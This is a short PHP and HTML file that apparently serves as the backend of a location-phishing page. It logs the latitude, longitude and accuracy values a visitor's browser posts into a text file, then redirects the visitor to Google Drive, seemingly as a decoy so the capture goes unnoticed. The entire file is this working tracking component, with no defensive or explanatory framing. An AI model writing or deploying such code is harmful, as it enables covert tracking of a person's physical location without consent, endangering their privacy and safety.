<?php 
  $lat = $_POST['lat'];
  $long = $_POST['long'];
  $acc = $_POST['acc'];
  
  $file = fopen('locations.txt', 'a');
  fwrite($file, "Latitude: ".$lat);
  fwrite($file, "\nLongitude: ".$long);
  fwrite($file, "\nAccuracy: ".$acc."\n\n");
  fclose($file);
?>


<html>
  <head>
    <meta http-equiv="refresh" content="1;url=https://drive.google.com">
  </head>
</head>